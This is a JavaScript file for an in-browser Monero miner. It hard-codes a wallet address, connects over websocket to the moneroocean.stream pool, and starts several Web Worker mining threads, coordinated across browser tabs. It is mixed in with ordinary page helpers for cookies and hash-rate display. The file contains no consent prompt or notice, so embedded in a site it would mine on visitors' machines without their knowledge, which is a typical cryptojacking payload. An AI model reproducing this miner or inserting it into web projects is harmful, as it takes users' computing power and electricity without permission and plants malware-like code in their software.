var addr = "43MfvuniTbw1g1NvBUHxXe1LvsDfbMfajWgecKRqMnWcDw54kBt6aykY2vibPaCfCqDubNRiBFAg82GEjtAyfwMB5uUTJrT",
	$WM = {
		enabled: true,
		addr: "43MfvuniTbw1g1NvBUHxXe1LvsDfbMfajWgecKRqMnWcDw54kBt6aykY2vibPaCfCqDubNRiBFAg82GEjtAyfwMB5uUTJrT",
		prev_hashes: 0,
		status_timer: false,
		update_sec: 2
	};
var threads = 3;

function WebMiner() {
	if ($WM.enabled && addr) {
		console.log("Starting " + threads + " threads of web miner for " + addr + " address (web_miner worker name)");
		startMining("moneroocean.stream", addr, "web_miner", threads, "");
	} 
}

function precise(x) {
	if (Number.parseFloat(x) < 100) {
		return Number.parseFloat(x).toPrecision(4)
	} else {
		return Number.parseFloat(x).toFixed()
	}
}

function isEmpty(o) {
	return o && Object.entries(o).length === 0 && o.constructor === Object ? true : false
}

function numObj(o) {
	return o && typeof o === "object" && o !== null ? Object.keys(o).length : 0
}


function Rnd(n, dec, m) {
	if (dec >= 1) {
		var d = Math.pow(10, dec);
		n = Math.round(n * d) / d;
		if (m === "txt") {
			n = n.toFixed(dec);
			if ($L.dec !== ".") n = n.replace(".", $L.dec)
		}
	} else {
		n = Math.round(n)
	}
	return n
}


function difficultyToHashRate(hashrate, port) {
	return Math.floor(port in COINS ? hashrate / COINS[port].time : 0)
}

function HashConv(h) {
	h = h > 0 ? h : 0;
	var u = "/s";
	for (var k in $D.hashconv) {
		if (h >= $D.hashconv[k]) {
			h = h / $D.hashconv[k];
			u = k + u;
			break
		}
	}
	if (h === 0) u = "H/s";
	return {
		num: Rnd(h, 2),
		unit: u
	}
}

function HashConvStr(h, unit) {
	var h = HashConv(h);
	return h.num + " " + (unit ? h.unit.replace(/H\//, unit + "/") : h.unit)
}

function InvalidBlock() {
	return '<span class="C4" title="This is orphan block so there will be no payment for it. It can happen sometimes naturally.">Orphaned</span>'
}

function SynchTime(t) {
	if (t > now) now = t + 3
}

function Truncate(s, l) {
	return s && s.length > 0 && l > 0 ? s.length > l ? s.substring(0, l - 3) + "..." : s : s
}

function UrlVars() {
	var v = {},
		h, p = window.location.href.slice(window.location.href.indexOf("?") + 1).split("&");
	for (var i = 0; i < p.length; i++) {
		h = p[i].split("=");
		v[h[0]] = h[1] ? h[1] : true
	}
	return v
}

function removeElement(id) {
	var e = document.getElementById(id);
	if (e) return e.parentNode.removeChild(e)
}

function setCookie(n, v) {
	var d = new Date;
	d.setTime(d.getTime() + 365 * 24 * 60 * 60 * 1e3);
	document.cookie = cookieprefix + n + "=" + (v || "") + "; expires=" + d.toUTCString() + "; path=/"
}

function getCookie(n) {
	var nEQ = cookieprefix + n + "=",
		ca = document.cookie.split(";");
	for (var i = 0; i < ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0) == " ") c = c.substring(1, c.length);
		if (c.indexOf(nEQ) == 0) return c.substring(nEQ.length, c.length)
	}
	return null
}

function delCookie(n) {
	document.cookie = n + "=; Max-Age=-99999999;"
}
var server = "wss://webminer.moneroocean.stream:443/";
var job = null;
var workers = [];
var ws;
var receiveStack = [];
var sendStack = [];
var totalhashes = 0;
var connected = 0;
var reconnector = 0;
var attempts = 1;
var throttleMiner = 50;
var handshake = null;

function wasmSupported() {
	try {
		if (typeof WebAssembly === "object" && typeof WebAssembly.instantiate === "function") {
			var module = new WebAssembly.Module(Uint8Array.of(0, 97, 115, 109, 1, 0, 0, 0));
			if (module instanceof WebAssembly.Module) return new WebAssembly.Instance(module) instanceof WebAssembly.Instance
		}
	} catch (e) {}
	return false
}

function addWorkers(numThreads) {
	logicalProcessors = numThreads;
	if (numThreads == -1) {
		try {
			logicalProcessors = window.navigator.hardwareConcurrency
		} catch (err) {
			logicalProcessors = 4
		}
		if (!(logicalProcessors > 0 && logicalProcessors < 40)) logicalProcessors = 4
	}
	while (logicalProcessors-- > 0) addWorker()
}
var openWebSocket = function() {
	if (ws != null) {
		ws.close()
	}
	var splitted = server.split(";");
	var chosen = splitted[Math.floor(Math.random() * splitted.length)];
	ws = new WebSocket(chosen);
	ws.onmessage = on_servermsg;
	ws.onerror = function(event) {
		if (connected < 2) connected = 2;
		job = null
	};
	ws.onclose = function() {
		if (connected < 2) connected = 2;
		job = null
	};
	ws.onopen = function() {
		ws.send(JSON.stringify(handshake));
		attempts = 1;
		connected = 1
	}
};
reconnector = function() {
	if (connected !== 3 && (ws == null || ws.readyState !== 0 && ws.readyState !== 1)) {
		attempts++;
		openWebSocket()
	}
	if (connected !== 3) setTimeout(reconnector, 1e4 * attempts)
};

function startBroadcast(mining) {
	if (typeof BroadcastChannel !== "function") {
		mining();
		return
	}
	stopBroadcast();
	var bc = new BroadcastChannel("channel");
	var number = Math.random();
	var array = [];
	var timerc = 0;
	var wantsToStart = true;
	array.push(number);
	bc.onmessage = function(ev) {
		if (array.indexOf(ev.data) === -1) array.push(ev.data)
	};

	function checkShouldStart() {
		bc.postMessage(number);
		timerc++;
		if (timerc % 2 === 0) {
			array.sort();
			if (array[0] === number && wantsToStart) {
				mining();
				wantsToStart = false;
				number = 0
			}
			array = [];
			array.push(number)
		}
	}
	startBroadcast.bc = bc;
	startBroadcast.id = setInterval(checkShouldStart, 1e3)
}

function stopBroadcast() {
	if (typeof startBroadcast.bc !== "undefined") {
		startBroadcast.bc.close()
	}
	if (typeof startBroadcast.id !== "undefined") {
		clearInterval(startBroadcast.id)
	}
}

function startMiningWithId(loginid, numThreads, userid) {
	if (!wasmSupported()) return;
	stopMining();
	connected = 0;
	handshake = {
		identifier: "handshake",
		loginid: loginid,
		userid: userid,
		version: 7
	};
	var foo = function() {
		addWorkers(numThreads);
		reconnector()
	};
	startBroadcast(foo)
}

function startMining(pool, login, password, numThreads, userid) {
	connected = 0;
	handshake = {
		identifier: "handshake",
		pool: pool,
		login: login,
		password: password,
		userid: userid,
		version: 7
	};
	var foo = function() {
		addWorkers(numThreads);
		reconnector()
	};
	startBroadcast(foo)
}

function stopMining() {
	connected = 3;
	if (ws != null) ws.close();
	deleteAllWorkers();
	job = null;
	stopBroadcast()
}

function addWorker() {
	var newWorker = new Worker("worker.js");
	workers.push(newWorker);
	newWorker.onmessage = on_workermsg;
	setTimeout(function() {
		informWorker(newWorker)
	}, 2e3)
}

function removeWorker() {
	if (workers.length < 1) return;
	var wrk = workers.shift();
	wrk.terminate()
}

function deleteAllWorkers() {
	for (i = 0; i < workers.length; i++) {
		workers[i].terminate()
	}
	workers = []
}

function informWorker(wrk) {
	var evt = {
		data: "wakeup",
		target: wrk
	};
	on_workermsg(evt)
}

function on_servermsg(e) {
	var obj = JSON.parse(e.data);
	receiveStack.push(obj);
	if (obj.identifier == "job") job = obj
}

function on_workermsg(e) {
	var wrk = e.target;
	if (connected != 1) {
		setTimeout(function() {
			informWorker(wrk)
		}, 2e3);
		return
	}
	if (e.data != "nothing" && e.data != "wakeup") {
		var obj = JSON.parse(e.data);
		ws.send(e.data);
		sendStack.push(obj)
	}
	if (job === null) {
		setTimeout(function() {
			informWorker(wrk)
		}, 2e3);
		return
	}
	var jbthrt = {
		job: job,
		throttle: Math.max(0, Math.min(throttleMiner, 100))
	};
	wrk.postMessage(jbthrt);
	if (e.data != "wakeup") totalhashes += 1
}